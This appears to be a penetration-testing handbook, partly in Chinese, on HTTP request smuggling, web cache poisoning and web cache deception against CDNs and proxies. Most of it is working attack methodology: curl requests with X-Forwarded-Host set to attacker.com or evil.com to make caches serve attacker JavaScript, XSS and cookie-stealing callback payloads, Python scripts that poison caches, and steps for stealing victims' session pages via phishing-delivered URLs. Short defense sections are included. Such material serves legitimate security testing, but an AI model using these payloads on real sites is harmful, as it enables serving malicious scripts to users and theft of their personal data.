| **Envoy** | Translates | Strips TE | Strict validation |
| **Traefik** | Translates | May pass TE | Passes CL |

### 7.3 GET Body Handling

| Product | Forwards GET Body | Notes |
|---|---|---|
| HAProxy | Yes | Default behavior |
| Nginx | Yes (as proxy) | Forwards if body present |
| Apache | Yes | Forwards body |
| Cloudflare | Strips | Removes GET body |
| AWS ALB | Depends on version | May strip |
| Varnish | Strips | Removes GET body |
| Envoy | Yes | Forwards |

### 7.4 Connection Reuse Behavior

| Product | Backend Connection Pooling | Impact on Smuggling |
|---|---|---|
| HAProxy | Yes (connection pool) | High risk — smuggled data affects other users |
| Nginx | Yes (keepalive upstream) | High risk |
| Cloudflare | Yes | High risk but strong normalization |
| AWS ALB | Yes | High risk |
| Envoy | Yes | Lower risk (strict parsing) |
| Varnish | Configurable | Depends on `beresp.do_stream` |

---

## 8. TESTING METHODOLOGY

### 8.1 Safe Probe Sequence

```
1. Identify architecture:
   - Check Via, Server, X-Served-By headers
   - Detect CDN (Cloudflare cf-ray, CloudFront x-amz-cf-id, etc.)

2. HTTP version probing:
   - curl --http2 https://target.com -v
   - Check if ALPN negotiation includes h2

3. Time-based desync detection:
   a. CL.TE probe:
      POST / HTTP/1.1
      Content-Length: 4
      Transfer-Encoding: chunked

      1
      A
      0

   b. If response is delayed → back-end is waiting for chunked end → CL.TE likely

4. H2 desync:
   - Send H2 request with content-length: 0 + body containing smuggled prefix
   - Follow with normal request; observe if response matches smuggled path

5. CL.0 detection:
   - Find endpoints returning without consuming body (redirects, static files)
   - Send POST with excess body, follow with normal GET
```

### 8.2 Tools

| Tool | Purpose |
|---|---|
| **Burp Suite HTTP Request Smuggler** | Automated variant scanning |
| **h2csmuggler** (GitHub) | HTTP/2 cleartext smuggling |
| **smuggler.py** (defparam) | CL.TE, TE.CL, TE.TE automation |
| **http2smugl** (GitHub) | H2-specific desync testing |
| **curl** with `--http2` / `--http1.1` | Manual H2/H1 probing |
| **hyper** (Python) | Low-level H2 frame crafting |

### 8.3 Impact Escalation Checklist

```
□ Confirmed desync variant (CL.TE / TE.CL / H2.CL / H2.TE / CL.0)
□ Can smuggle full request? (not just prefix)
□ Connection pooling enabled? (affects other users → critical)
□ Cacheable endpoints exist? (→ cache poisoning)
□ Authenticated endpoints reachable? (→ auth bypass, data theft)
□ Can reflect content in response? (→ stored XSS via cache)
□ Admin/internal paths accessible? (→ privilege escalation)
□ Client-side desync possible? (→ per-user attacks)
```


---

> 结构：上半原有是主线（unkeyed / 欺骗）；下半补充 + 文末附件加深。先确认缓存键再打投毒。手法索引「缓存欺骗偷会话页」在原有「四、Web 缓存欺骗」下，用标题搜即可。
>
> 写不写只认 `../hw-rules/report-format.md`。只探到缓存键、没有投毒/偷会话 → 继续跟投毒/偷会话。有会话个人页/账单/`/api/me` 就可以打后缀，不必先看见 `X-Cache`。没这类页，不要为了勾表空加 `.css`。


## 缓存投毒测试手册

## 一、Web 缓存投毒原理

### 核心概念

```
缓存键 (Cache Key): 决定缓存条目的唯一标识
  通常包含: Host, Path, Query String

Unkeyed 输入: 不在缓存键中，但影响响应内容的输入
  例如: X-Forwarded-Host, User-Agent, Cookie

攻击原理:
1. 找到 unkeyed 输入
2. 构造恶意请求，响应包含恶意内容
3. 响应被缓存
4. 其他用户访问相同 URL，获得被投毒的缓存
```

---

## 二、缓存键分析

### 2.1 识别缓存行为

```bash
# 发送两次相同请求，观察响应头
curl -I "https://target.com/page" -H "X-Test: 1"
curl -I "https://target.com/page" -H "X-Test: 2"

# 关注响应头:
# X-Cache: HIT / MISS
# CF-Cache-Status: HIT / MISS (Cloudflare)
# Age: 123 (缓存存在时间)
# Cache-Control: max-age=3600
```

### 2.2 测试 Unkeyed 输入

```python
import requests

def test_unkeyed_inputs(url):
    """测试哪些输入不在缓存键中"""
    
    headers_to_test = [
        "X-Forwarded-Host",
        "X-Forwarded-Scheme",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Forwarded-Proto",
        "X-Host",
        "X-Forwarded-Server",
        "User-Agent",
        "Accept-Language",
        "Cookie",
    ]
    
    for header in headers_to_test:
        # 发送带有唯一值的请求
        unique_value = f"test-{header}-123"
        r1 = requests.get(url, headers={header: unique_value})
        
        # 再次请求（不带该头）
        r2 = requests.get(url)
        
        # 如果 r2 响应中包含 unique_value → 该头是 unkeyed
        if unique_value in r2.text:
            print(f"[!] Unkeyed 输入发现: {header}")
            print(f"    响应中包含: {unique_value}")
```

---

## 三、常见 Unkeyed 输入

### 3.1 X-Forwarded-Host

```bash
# 攻击: 修改资源加载路径
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"

# 如果响应中包含:
<script src="//attacker.com/static/js/app.js"></script>

# 结果: 缓存被投毒，所有用户加载攻击者的 JS
```

### 3.2 X-Forwarded-Scheme / X-Forwarded-Proto

```bash
# 攻击: 降级 HTTPS 到 HTTP
curl "https://target.com/" \
  -H "X-Forwarded-Scheme: http"

# 响应中的链接可能变成:
<link href="http://target.com/style.css">

# 结果: 中间人攻击风险
```

### 3.3 X-Original-URL / X-Rewrite-URL

```bash
# 攻击: 缓存错误页面到正常 URL
curl "https://target.com/normal-page" \
  -H "X-Original-URL: /admin/secret"

# 如果后端用 X-Original-URL 路由，但缓存用原始 URL
# 结果: /normal-page 被缓存为 /admin/secret 的内容
```

### 3.4 UTM 参数

```bash
# 营销参数通常不在缓存键中
curl "https://target.com/?utm_source=<script>alert(1)</script>"

# 如果响应中反射该参数:
<div>来源: <script>alert(1)</script></div>

# 结果: XSS 被缓存
```

---

## 四、Web 缓存欺骗

### 缓存欺骗偷会话页（手法索引有指针）

认：登录后个人页、账单、`/api/me`、设置页。有 `X-Cache` / `Age` / `Via` 更好认，**不是前提**。

打：

1. 未登录先打原 path，记下基线（应 401 / 登录页 / 空）。
2. **要会话**打开同一页，再请求 `原path/x.css`、`原path;.css`、`原path%2f.css`。
3. 看 `X-Cache: HIT` / `Age` 涨了没有。再**未登录**打同一个带后缀 URL。

算成：未登录拿到**别人**个人页/账单/会话页正文（姓名、手机、Cookie 页）。只 HIT 了 CSS 壳不算。

假点：`Cache-Control: no-store`；后缀被应用 404；要受害人先点才缓存、你这边没拿到他人数据。单站没中不删手法索引这行。有会话页就可以打，不必先看见缓存头。没个人页/账单不要为了勾表空加后缀。

投毒（unkeyed 头把别人页面改成你的 JS）是另一条，细节在下半补充和附件。

### 4.1 路径混淆

```bash
# 原理: 缓存和应用对路径的解析不一致

# 攻击 1: 静态资源后缀
curl "https://target.com/profile/victim.css"

# 缓存: 认为是 CSS 文件，缓存
# 应用: 忽略 .css，返回 /profile/victim 的内容
# 结果: 受害者的个人信息被缓存为公开的 CSS 文件

# 攻击 2: 路径参数
curl "https://target.com/profile;.css"
curl "https://target.com/profile%2f.css"
curl "https://target.com/profile%2e%2e%2fstatic/style.css"
```

### 4.2 诱导受害者访问

```html
<!-- 攻击者发送钓鱼邮件 -->
<img src="https://target.com/profile/victim.css">

<!-- 受害者点击后，其个人信息被缓存 -->
<!-- 攻击者访问相同 URL，获取缓存的敏感信息 -->
```

---

## 五、缓存键规范化差异

### 5.1 编码差异

```bash
# 缓存和应用对 URL 编码的处理不同

# 请求 1
curl "https://target.com/page?param=value"

# 请求 2
curl "https://target.com/page?param=%76%61%6c%75%65"

# 如果缓存认为两者不同，但应用认为相同
# 可以绕过缓存，直接访问应用
```

### 5.2 路径规范化

```bash
# 请求 1
curl "https://target.com/page"

# 请求 2
curl "https://target.com/./page"
curl "https://target.com//page"
curl "https://target.com/page/"

# 不同的规范化可能导致缓存绕过或投毒
```

---

## 六、CDN 特定技巧

### 6.1 Cloudflare

```bash
# Cloudflare 缓存键: Host + Path + Query String (sorted)

# Unkeyed 输入:
# - CF-Connecting-IP
# - CF-IPCountry
# - CF-Visitor
# - Cookie (部分)

# 测试
curl "https://target.com/" \
  -H "CF-Connecting-IP: 127.0.0.1"
```

### 6.2 Akamai

```bash
# Akamai 缓存键: 可配置，通常包含 Host + Path

# Unkeyed 输入:
# - True-Client-IP
# - X-Forwarded-For
# - Pragma: akamai-x-cache-on (调试头)

# 测试
curl "https://target.com/" \
  -H "True-Client-IP: 127.0.0.1" \
  -H "Pragma: akamai-x-cache-on"
```

### 6.3 Fastly

```bash
# Fastly 缓存键: Host + Path + Query String

# Unkeyed 输入:
# - Fastly-Client-IP
# - X-Forwarded-Host
# - Surrogate-Key (缓存标签)

# 测试
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"
```

---

## 七、测试工具

### 7.1 Param Miner (Burp 插件)

```
功能:
- 自动检测 unkeyed 输入
- 测试缓存键组成
- 识别缓存投毒机会

使用:
1. Burp → Extender → BApp Store → Param Miner
2. 右键请求 → Extensions → Param Miner → Guess headers
3. 查看结果
```

### 7.2 手动测试脚本

```python
import requests
import hashlib

def test_cache_poisoning(url, header, value):
    """测试缓存投毒"""
    
    # 生成唯一标识
    unique_id = hashlib.md5(f"{header}{value}".encode()).hexdigest()[:8]
    
    # 发送投毒请求
    poison_value = f"{value}-{unique_id}"
    r1 = requests.get(url, headers={header: poison_value})
    
    print(f"[*] 发送投毒请求: {header}: {poison_value}")
    print(f"    响应状态: {r1.status_code}")
    print(f"    缓存状态: {r1.headers.get('X-Cache', 'Unknown')}")
    
    # 等待缓存生效
    import time
    time.sleep(2)
    
    # 发送正常请求（不带恶意头）
    r2 = requests.get(url)
    
    print(f"[*] 发送正常请求")
    print(f"    响应状态: {r2.status_code}")
    print(f"    缓存状态: {r2.headers.get('X-Cache', 'Unknown')}")
    
    # 检查是否被投毒
    if unique_id in r2.text:
        print(f"[!] 缓存投毒成功！")
        print(f"    响应中包含: {unique_id}")
        return True
    else:
        print(f"[-] 缓存投毒失败")
        return False

# 使用示例
url = "https://target.com/"
headers_to_test = [
    ("X-Forwarded-Host", "attacker.com"),
    ("X-Forwarded-Scheme", "http"),
    ("X-Original-URL", "/admin"),
]

for header, value in headers_to_test:
    test_cache_poisoning(url, header, value)
    print("-" * 80)
```

### 7.3 缓存键探测

```python
def detect_cache_key(url):
    """探测缓存键组成"""
    
    import random
    
    components = {
        "Host": f"test{random.randint(1000,9999)}.com",
        "Path": f"/test{random.randint(1000,9999)}",
        "Query": f"?test={random.randint(1000,9999)}",
        "Method": "POST",
        "Body": f"test={random.randint(1000,9999)}",
    }
    
    results = {}
    
    # 测试每个组件
    for component, value in components.items():
        # 发送两次请求，第二次修改该组件
        r1 = requests.get(url)
        cache_status_1 = r1.headers.get('X-Cache', 'Unknown')
        
        if component == "Host":
            r2 = requests.get(url, headers={"Host": value})
        elif component == "Path":
            r2 = requests.get(url + value)
        elif component == "Query":
            r2 = requests.get(url + value)
        elif component == "Method":
            r2 = requests.post(url)
        elif component == "Body":
            r2 = requests.post(url, data=value)
        
        cache_status_2 = r2.headers.get('X-Cache', 'Unknown')
        
        # 如果第二次是 MISS，说明该组件在缓存键中
        if cache_status_2 == "MISS":
            results[component] = "In cache key"
        else:
            results[component] = "Not in cache key"
    
    return results
```

---

## 八、利用场景

### 8.1 XSS 缓存投毒

```bash
# 找到反射 XSS 点
curl "https://target.com/search?q=<script>alert(1)</script>"

# 如果该页面被缓存，所有用户访问时触发 XSS
```

### 8.2 钓鱼页面缓存

```bash
# 投毒首页，显示钓鱼内容
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"

# 响应中加载攻击者的 JS，显示假登录框
```

### 8.3 敏感信息泄露

```bash
# 缓存欺骗，将个人信息缓存为公开资源
curl "https://target.com/profile/victim.css"

# 攻击者访问相同 URL，获取受害者信息
```

---

## 九、防护检测

```python
# 检测是否有防护

# 1. 严格的缓存键
# 特征: 所有影响响应的输入都在缓存键中

# 2. 输入验证
# 特征: 拒绝异常的 X-Forwarded-* 头

# 3. 缓存隔离
# 特征: 敏感页面不被缓存（Cache-Control: no-store）

# 4. 响应头检查
# 特征: 响应中不反射 unkeyed 输入
```

---

## 十一、参考资源

```
# Web Cache Poisoning 研究
https://portswigger.net/research/practical-web-cache-poisoning

# Web Cache Deception 研究
https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html

# Burp Param Miner
https://github.com/PortSwigger/param-miner
```

---

## 竞态补充

### web-cache

### Web Cache Deception

## 1. CORE CONCEPTS

### Web Cache Deception (steal authenticated data)

The attacker tricks a victim into requesting their authenticated page at a URL that the cache considers static:

```
Victim visits: https://target.com/account/profile/nonexistent.css
→ Application ignores "nonexistent.css", serves /account/profile (with auth data)
→ CDN sees .css extension → caches the response
→ Attacker fetches: https://target.com/account/profile/nonexistent.css
→ CDN serves cached authenticated content → attacker reads victim's data
```

### Web Cache Poisoning (serve malicious content)

The attacker manipulates unkeyed request components (headers, cookies) to make the cache store a malicious response:

```
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
→ Application generates: <script src="https://evil.com/js/app.js">
→ Cache stores this response
→ Normal users hit cache → load attacker's JavaScript
```

---

## 2. CACHE DECEPTION — ATTACK METHODOLOGY

### Step 1: Identify Cacheable Path Patterns

CDNs typically cache by file extension:
```text
.css  .js  .jpg  .png  .gif  .svg  .ico
.woff .woff2  .ttf  .pdf  .json (sometimes)
```

### Step 2: Test Path Confusion

```text
### Append static extension to authenticated endpoint:
https://target.com/api/me/info.css
https://target.com/account/profile/x.js
https://target.com/settings/avatar.png
https://target.com/dashboard/data.json

### Path traversal style:
https://target.com/account/profile/..%2fstatic/app.css
```

### Step 3: Verify Caching

```bash
### Request as victim (authenticated):
curl -H "Cookie: session=VICTIM" https://target.com/account/profile/x.css

### Check response headers:
### X-Cache: MISS (first request)
### Age: 0

### Request again as attacker (no auth):
curl https://target.com/account/profile/x.css

### Check response:
### X-Cache: HIT
### Contains victim's authenticated content? → vulnerable
```

### Step 4: Deliver to Victim

Send the crafted URL to victim via phishing, message, or embed:
```
https://target.com/account/profile/tracking.gif
```

---

## 3. CACHE POISONING — ATTACK METHODOLOGY

### Unkeyed Input Discovery

Cache keys typically include: `Host`, URL path, query string.
These are typically NOT in the cache key: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, cookies, custom headers.

```bash
### Test if X-Forwarded-Host is reflected but not keyed:
curl -H "X-Forwarded-Host: evil.com" https://target.com/page
### If response contains evil.com and caches → poisonable
```

### Common Unkeyed Headers

```text
X-Forwarded-Host      X-Forwarded-Scheme    X-Forwarded-Proto
X-Original-URL        X-Rewrite-URL         X-Host
X-Forwarded-Server    Forwarded             True-Client-IP
```

### Cache Poisoning via Host Header

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

→ Response: <link href="//evil.com/static/main.css">
→ Cached → all users load attacker's CSS/JS
```

---

## 4. PATH NORMALIZATION DIFFERENCES

The key to cache deception: **CDN and application normalize paths differently**.

| Component | Behavior |
|---|---|
| CDN (Cloudflare, Akamai) | Caches based on full URL path including extension |
| Application (Rails, Django, Express) | May ignore trailing path segments or extensions |
| Reverse proxy (Nginx) | May strip or rewrite path before forwarding |

```text
### Application treats these as equivalent:
/account/profile
/account/profile/anything
/account/profile/x.css
/account/profile;.css

### CDN treats .css as cacheable static asset
→ Mismatch = vulnerability
```

---

## 5. CACHE POISONING REAL-WORLD PATTERN

### X-Forwarded-Host → Open Graph / Meta Tag Injection

```text
### Target page uses X-Forwarded-Host to generate meta tags:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

### Response:
<meta property="og:image" content="https://evil.com/assets/logo.png">
### or:
<link rel="canonical" href="https://evil.com/">

### If response is cached → all users see evil.com references
### Impact: XSS via injected JS path, phishing via canonical redirect, SEO hijack
```

### Cache Deception with Path Separator Tricks

```text
### Semicolon (treated as path parameter by some frameworks):
/account/profile;.css

### Encoded separators:
/account/profile%2F.css

### Trailing dot/space:
/account/profile/.css
/account/profile .css
```

---

## 6. DEFENSE

### For Cache Deception

- Cache only explicitly static paths (e.g., `/static/*`, `/assets/*`)
- Never cache based on file extension alone
- Set `Cache-Control: no-store, private` on authenticated endpoints
- Use `Vary: Cookie` to prevent cross-user cache hits

### For Cache Poisoning

- Include all reflected headers in cache key
- Validate and sanitize `X-Forwarded-*` headers
- Use `Cache-Control: no-cache` for dynamic content
- Strip unknown headers at CDN edge

---

## 6. TESTING CHECKLIST

```
□ Identify CDN/cache layer (X-Cache, Age, Via headers)
□ Append .css/.js/.png to authenticated API endpoints
□ Check if response is cached (X-Cache: HIT on second request)
□ Test path separators: /x.css, ;.css, %2F.css
□ Test unkeyed headers: X-Forwarded-Host, X-Original-URL
□ Verify Cache-Control headers on sensitive endpoints
□ Check Vary header presence
□ Test with and without authentication
```


---


## 附件：CACHE_POISONING_TECHNIQUES

### Web Cache Poisoning Techniques — Advanced Reference


## 1. WEB CACHE POISONING vs WEB CACHE DECEPTION

These are **distinct attack classes** — do not confuse them.

| Aspect | Cache Poisoning | Cache Deception |
|---|---|---|
| **Goal** | Serve **malicious content** to all users | Steal **victim's authenticated data** |
| **Who triggers** | Attacker sends poisoning request | Victim visits crafted URL |
| **What gets cached** | Attacker-controlled response (XSS, redirect) | Victim's authenticated response |
| **Who is harmed** | All users who hit the cache | The specific victim whose data is cached |
| **Attacker's role** | Active (sends request with unkeyed poison) | Passive (waits for victim, then reads cache) |
| **Key technique** | Unkeyed input manipulation | Path confusion / extension appending |
| **Detection signal** | Response contains unexpected injected content | Authenticated content accessible without auth |

### Attack Flow Comparison

```
CACHE POISONING:
  Attacker → sends request with X-Forwarded-Host: evil.com
  → Cache stores response with evil.com references
  → Normal users get poisoned response

CACHE DECEPTION:
  Attacker → tricks victim into visiting /profile/x.css
  → Server returns victim's profile data (ignores x.css)
  → Cache stores response (thinks it's static CSS)
  → Attacker fetches /profile/x.css → reads victim's data
```

---

## 2. UNKEYED HEADER POISONING

### 2.1 Cache Key Basics

The **cache key** is what the cache uses to determine if a stored response matches a request. Typically includes:
- HTTP method
- Host header
- URL path
- Query string (sometimes)

**NOT typically included** (= unkeyed):
- Most request headers
- Cookies (sometimes)
- Request body (for GET)

If an unkeyed input is **reflected** in the response, it can be poisoned.

### 2.2 X-Forwarded-Host Poisoning

The most common cache poisoning vector.

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

HTTP/1.1 200 OK
...
<script src="https://evil.com/static/app.js"></script>
```

If `X-Forwarded-Host` is not in the cache key but is reflected in the response → poison stores `evil.com` JavaScript for all users requesting `/`.

**Common reflection points**:
- `<script src="...">` and `<link href="...">`
- Open Graph meta tags: `<meta property="og:url" content="...">`
- Canonical links: `<link rel="canonical" href="...">`
- Resource prefetch: `<link rel="dns-prefetch" href="...">`
- Dynamic import maps

### 2.3 X-Forwarded-Scheme / X-Forwarded-Proto

Forces HTTPS → HTTP downgrade in cached response:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http

HTTP/1.1 301 Moved
Location: http://target.com/    ← now HTTP, not HTTPS
```

Cache stores a redirect to HTTP → MITM opportunity for all cached users.

### 2.4 X-Original-URL / X-Rewrite-URL

Some frameworks (IIS/ASP.NET, Symfony) use these headers to override the request path:

```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin/delete-user?id=1

Cache key = GET /
But server processes /admin/delete-user?id=1
Response gets cached under /
```

### 2.5 Multiple Host Headers

```http
GET / HTTP/1.1
Host: target.com
Host: evil.com

### Some caches key on first Host, some apps use last Host
### If cache keys on target.com but app reflects evil.com → poisoned
```

### 2.6 X-Forwarded-Port

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Port: 1337

### If port is reflected in absolute URLs:
### <a href="https://target.com:1337/path">
### May cause resource loading failures → DoS via cache poisoning
```

### 2.7 Discovery Methodology

```bash
### Step 1: Identify cache (check response headers)
curl -v https://target.com/ 2>&1 | grep -i "x-cache\|age\|via\|cf-cache"

### Step 2: Find reflected unkeyed headers
### Send request with unique header values:
curl -H "X-Forwarded-Host: canary123.com" https://target.com/ | grep "canary123"
curl -H "X-Forwarded-Scheme: canary" https://target.com/ | grep "canary"
curl -H "X-Original-URL: /canary" https://target.com/ | grep "canary"

### Step 3: Verify it's unkeyed
### Send normal request → check if canary value is in cached response:
curl https://target.com/ | grep "canary123"
### If found → successfully poisoned

### Tool: Param Miner (Burp extension) automates unkeyed header discovery
```

---

## 3. UNKEYED PARAMETER POISONING

### 3.1 Concept

Some query parameters are excluded from the cache key (for tracking, analytics, etc.) but are reflected in the response.

### 3.2 Common Unkeyed Parameters

```
utm_content      utm_source       utm_medium       utm_campaign
utm_term         fbclid           gclid            _ga
dclid            msclkid          mc_eid           ref
callback         jsonp            _                cb
```

### 3.3 Example Attack

```http
GET /page?utm_content="><script>alert(1)</script> HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
...
<a href="/page?utm_content="><script>alert(1)</script>">Share</a>
```

Cache key: `GET /page` (utm_content excluded)
Response: contains XSS payload
Result: all users visiting `/page` get XSS.

### 3.4 Parameter Discovery

```bash
### Burp Param Miner: "Guess query parameters" scan

### Manual: append unique parameter and check if cache key changes
curl "https://target.com/page?cachebuster=abc123" -v
### → X-Cache: MISS (new cache entry? or same as /page?)

curl "https://target.com/page" -v
### → X-Cache: HIT and response matches previous? Then /page is the key (query excluded)
### → X-Cache: MISS? Then query IS in the key
```

### 3.5 Reflected Parameter in JavaScript

```http
GET /page?callback=alert HTTP/1.1

HTTP/1.1 200 OK
<script>
var config = {
  callback: "alert",  // reflected from query parameter
  ...
};
</script>
```

If `callback` is excluded from cache key but reflected in JavaScript:

```http
GET /page?callback=alert(document.cookie)// HTTP/1.1
```

Cached for all users requesting `/page`.

---

## 4. FAT GET CACHE POISONING

### 4.1 Concept

Some origins accept and process GET request **body** (despite RFC discouraging it). If the cache ignores the body (not in cache key) but the origin reflects body content, the response can be poisoned.

### 4.2 Example

```http
GET /api/config HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

callback=alert(1)

HTTP/1.1 200 OK
Content-Type: application/javascript
Cache-Control: public, max-age=3600

alert(1)({"theme":"default","lang":"en"})
```

Cache key: `GET /api/config` (body not included)
Response: contains attacker's callback value
Result: all users get `alert(1)` when loading `/api/config`.

### 4.3 Detection

```bash
### Step 1: Check if origin processes GET body
curl -X GET https://target.com/api/endpoint \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=canary_value"
### Check if canary_value appears in response

### Step 2: Check if response is cached
curl https://target.com/api/endpoint
### Check X-Cache header and whether canary_value persists

### If canary in cached response → Fat GET poisoning confirmed
```

### 4.4 Frameworks That Process GET Body

| Framework | GET Body Processing |
|---|---|
| Ruby on Rails | Yes (parsed by default) |
| Express.js | Depends on middleware (body-parser) |
| Django | Yes (request.POST populated for GET with body) |
| Flask | Yes (request.form available) |
| ASP.NET | Depends on model binding configuration |
| Spring | Depends on `@RequestBody` annotation |

---

## 5. PARAMETER CLOAKING

### 5.1 Semicolon as Parameter Separator

Some platforms treat `;` as a parameter separator, others don't:

```http
GET /page?legit=value;poison=xss HTTP/1.1

### Ruby on Rails: parses as two params: legit=value, poison=xss
### PHP: parses as one param: legit=value;poison=xss
### Cache (Varnish): may key on "legit=value;poison=xss" as opaque string
```

**Exploit**: if cache keys on full query string but back-end parses `;` as separator:

```http
GET /page?legit=value;callback=alert(1) HTTP/1.1

### Cache key: /page?legit=value;callback=alert(1)
### Origin parses: legit=value AND callback=alert(1)
### Response reflects: alert(1) in callback
### Next request to /page?legit=value;callback=alert(1) gets poisoned response
```

### 5.2 Different Delimiter Parsing

| Platform | `;` Behavior | `&` Behavior |
|---|---|---|
| PHP | Literal (part of value) | Parameter separator |
| Ruby on Rails | Parameter separator | Parameter separator |
| Java (Servlet) | Parameter separator (`;` in path = path parameter) | Parameter separator |
| ASP.NET | Depends on configuration | Parameter separator |
| Node.js (querystring) | Literal | Parameter separator |
| Python (urllib) | Can be configured as separator | Parameter separator |

### 5.3 Duplicate Parameters

```http
GET /page?param=safe&param=<script>alert(1)</script> HTTP/1.1

### Cache may key on first occurrence: param=safe
### Origin may use last occurrence: param=<script>alert(1)</script>
```

| Platform | Duplicate Parameter Behavior |
|---|---|
| PHP | Last value wins |
| ASP.NET | Comma-joined (both values) |
| Ruby on Rails | Last value wins |
| Python Flask | First value wins |
| Java Servlet | First value wins (`getParameter`), all values (`getParameterValues`) |
| Node.js Express | Array of all values |

### 5.4 URL Path Parameter Cloaking

```http
### Semicolons in URL path (Java servlet path parameters):
GET /page;jsessionid=abc;param=value HTTP/1.1

### Tomcat/Jetty: strips ;param=value from path
### Cache: may include full path in key or strip differently
```

---

## 6. CDN-SPECIFIC BEHAVIOR

### 6.1 Cloudflare

```
### Cache status header: cf-cache-status
### Values: HIT, MISS, EXPIRED, DYNAMIC, BYPASS

### Default caching: by file extension (.js, .css, .png, etc.)
### Query strings: included in cache key by default
### Headers in key: Host only

### Page Rules: can force cache of HTML / API responses
### Cache-Control respected: yes

### Bypass methods:
### - Set Cache-Control: no-cache on origin
### - Use __cf_chl_jschl_tk__ (Cloudflare challenge token) — not in key

### Interesting behaviors:
### - Cloudflare Workers can modify cache key
### - cf-connecting-ip header added (unkeyed, may be reflected)
### - True-Client-IP header (unkeyed on some plans)
```

### 6.2 AWS CloudFront

```
### Cache status header: x-cache (Hit from cloudfront / Miss from cloudfront)
### Also: x-amz-cf-id, x-amz-cf-pop

### Default cache key: Host + URI path + query string
### Query strings: can be configured (all, none, whitelist)
### Headers in key: configurable via Cache Policy (Host, Accept, etc.)
### Cookies in key: configurable (all, none, whitelist)

### Gotchas:
### - Default: query strings NOT in cache key (must configure)
### - Default: cookies NOT in cache key
### - Can whitelist specific headers/cookies into key

### Poisoning opportunity:
### If query strings excluded → append reflected param → poison
### If X-Forwarded-Host not in key but reflected → classic poisoning
```

### 6.3 Akamai

```
### Cache status header: X-Cache (TCP_HIT, TCP_MISS)
### Also: X-Akamai-Request-ID

### Cache key (default): Host + path + query (configurable)
### "Cache ID Modification" feature: custom key composition
### "Remove Vary Header" feature: strips Vary

### Interesting behaviors:
### - Pragma: akamai-x-cache-on (enable cache debug)
### - Pragma: akamai-x-get-cache-key (reveal cache key)
### - Akamai-Transform header (can affect response)
### - True-Client-IP (unkeyed, may be reflected)

### Revealing cache key (if debug enabled):
curl -H "Pragma: akamai-x-get-cache-key" https://target.com/ -v
```

### 6.4 Varnish

```
### Cache status header: X-Varnish (two IDs = HIT, one ID = MISS)
### Also: Age, Via (varnish)

### Default cache key: req.url (path + query)
### VCL customization: hash_data() in vcl_hash
### Default: does NOT cache requests with Cookie header

### Interesting behaviors:
### - obj.hits indicates number of cache hits
### - X-Varnish-Cache header (custom)
### - Builtin: strips If-Modified-Since on cache hit

### VCL key inspection:
### If you have access to VCL config, look at vcl_hash for key composition
### sub vcl_hash {
###   hash_data(req.url);
###   hash_data(req.http.host);
### }
```

### 6.5 Fastly

```
### Cache status header: X-Cache (HIT, MISS)
### Also: X-Served-By, X-Cache-Hits, X-Timer

### Fastly uses Varnish under the hood
### VCL-based configuration
### Default cache key: URL + Host
### Surrogate-Control header: overrides Cache-Control for CDN
### Fastly-Debug: 1 (if enabled → reveals cache details)

### Interesting behaviors:
### - Surrogate-Key header for purge targeting
### - stale-while-revalidate support
### - ESI (Edge Side Includes) support — can be attack vector
```

### 6.6 CDN Cache Key Comparison

| CDN | Default Cache Key Components | Query String Default | Cookie Default |
|---|---|---|---|
| Cloudflare | Host + path + query | Included | Excluded |
| CloudFront | Host + path (query configurable) | Excluded by default | Excluded |
| Akamai | Host + path + query | Included | Excluded |
| Varnish | URL (path + query) | Included | Excluded (no cache with Cookie) |
| Fastly | Host + URL | Included | Excluded |
| Nginx (proxy_cache) | `$scheme$proxy_host$request_uri` | Included | Excluded |

---

## 7. VARY HEADER MANIPULATION

### 7.1 How Vary Works

The `Vary` header tells caches which request headers affect the response. Cache must store separate entries for different values of Vary'd headers.

```http
HTTP/1.1 200 OK
Vary: Accept-Encoding, Accept-Language
```

This means: cache must key on `Accept-Encoding` AND `Accept-Language` values.

### 7.2 Cache Partitioning Attack

If `Vary` doesn't include a header that the application uses to generate different content:

```http
### Application returns different content based on User-Agent:
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (mobile)
→ Returns mobile version

GET / HTTP/1.1  
User-Agent: Mozilla/5.0 (desktop)
→ Returns desktop version

### If Vary does NOT include User-Agent:
### Cache stores one response for all User-Agent values
### Attacker can poison mobile users with desktop content (or vice versa)
```

### 7.3 Vary Header Injection

If attacker can influence the Vary header value:

```http
### Application sets Vary based on request:
Vary: Accept-Encoding, X-Custom-Header

### If attacker adds X-Custom-Header:
GET / HTTP/1.1
X-Custom-Header: unique-value

### Cache creates new partition for this unique value
### Attacker poisons only this partition
### Then links victim to URL with same X-Custom-Header value
```

### 7.4 Vary: * (Wildcard)

```http
Vary: *
```

Tells cache to never serve cached version. Some caches respect this, others ignore it.

| CDN | Vary: * Behavior |
|---|---|
| Cloudflare | Does not cache |
| CloudFront | Does not cache |
| Varnish | Depends on VCL config |
| Nginx | Does not cache (default) |

### 7.5 Missing Vary as a Vulnerability

```
### Application returns personalized content:
GET /dashboard HTTP/1.1
Cookie: session=USER_A_TOKEN
→ Returns User A's dashboard

### If response lacks Vary: Cookie AND cache stores it:
### → User B requests /dashboard → gets User A's cached dashboard
### This IS cache deception (without the victim needing to visit a crafted URL)
```

---

## 8. ADVANCED TECHNIQUES

### 8.1 Cache Poisoning via Error Pages

```http
### Trigger a 404 with injected content:
GET /nonexistent%0D%0AX-Injected:%20yes HTTP/1.1
Host: target.com

### If 404 page reflects the requested path and is cached:
### All users requesting this path get the injected error page
```

### 8.2 Edge Side Includes (ESI) Injection

```http
### If CDN supports ESI and reflects unkeyed input:
GET / HTTP/1.1
X-Forwarded-Host: evil.com

Response:
<esi:include src="http://evil.com/xss.html"/>

